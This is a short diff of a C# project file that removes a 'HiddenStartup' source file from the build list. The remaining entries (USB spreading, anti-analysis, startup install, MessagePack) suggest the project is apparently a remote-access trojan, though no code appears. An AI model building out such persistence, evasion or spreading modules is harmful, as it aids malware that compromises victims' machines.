@@ -88,7 +88,6 @@
     <Compile Include="Handle Packet\HandleLimeUSB.cs" />
     <Compile Include="Helper\Anti_Analysis.cs" />
     <Compile Include="Helper\Methods.cs" />
-    <Compile Include="Install\HiddenStartup.cs" />
     <Compile Include="Install\NormalStartup.cs" />
     <Compile Include="MessagePack\BytesTools.cs" />
     <Compile Include="MessagePack\MsgPack.cs" />
